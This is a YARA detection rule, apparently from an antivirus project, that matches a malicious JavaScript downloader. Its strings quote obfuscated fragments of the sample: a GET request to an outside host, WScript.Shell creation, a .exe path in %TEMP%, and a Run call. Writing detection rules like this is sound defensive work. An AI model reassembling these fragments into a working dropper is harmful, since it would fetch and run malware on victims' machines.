rule sig_20160330_8c5cba496fbc94b4658f24a5154584d9 {
  meta:
    description = "datamaliciousorder - file 20160330_8c5cba496fbc94b4658f24a5154584d9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ca2e3ec210bfa9af4486c5b8904a02f209eb91a329140f1ca55c9fee3a433037"

  strings:
    $s1  = "_Q[_GY](\"GET\", \"http://shopyb.com/s6dlas\", false);" fullword ascii
    $s2  = "var _I = function _ZB() {return WScript[_Y0](\"WScript\"+\".Shell\");}(), _RF = 11;" fullword ascii
    $s3  = "function _KJ(_J, _EY){_A0 = _A0 * 1; return _J - _EY;};" fullword ascii
    $s4  = "if (_Q[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _G() {return _I[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9THmzDw0h.ex\" + \"e\";};" fullword ascii
    $s6  = "function _S(){return _N + \"\";};" fullword ascii
    $s7  = "function _Y(_N0){_I[\"Run\"](_N0, _A0, _A0);};" fullword ascii
    $s8  = "function _D() {return ((_TJ == true) && (_TJ == _BP)) ? 1 : _A0;};" fullword ascii
    $s9  = " while (_L){" fullword ascii
    $s10 = "function _KO(){return 22;};" fullword ascii
    $s11 = "function _RU()" fullword ascii
    $s12 = "return _KJ(_K, _B0);" fullword ascii
    $s13 = "var _HL = new this[\"Date\"]();" fullword ascii
    $s14 = "function _A(){return _Y0;};" fullword ascii
    $s15 = "function _GX(_JY) {var _V0 = (1, 2, 3, 4, 5, _JY); return _V0;};" fullword ascii
    $s16 = "_BP = true; " fullword ascii
    $s17 = "_TJ = true; " fullword ascii
    $s18 = "var _TJ = false;" fullword ascii
    $s19 = "var _OJ0 = false;" fullword ascii
    $s20 = "var _BP = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}